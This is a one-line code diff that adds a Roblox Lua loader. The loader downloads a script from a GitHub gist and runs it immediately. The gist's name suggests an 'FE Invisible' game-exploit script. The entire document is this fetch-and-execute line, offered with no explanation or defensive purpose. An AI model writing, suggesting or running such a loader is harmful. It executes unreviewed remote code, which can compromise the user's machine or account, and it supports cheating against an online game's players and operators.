@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://gist.githubusercontent.com/CloudHub111/ad7566afa0721bb75731c96b2ff3b94b/raw/84d08a9ce82c82148e35784c1be0571e7cc4d606/Fe%2520Invisible-Roblox%2520User%2520BaconPov9-Scriptblox%2520User%2520Kkk1_",true))() 
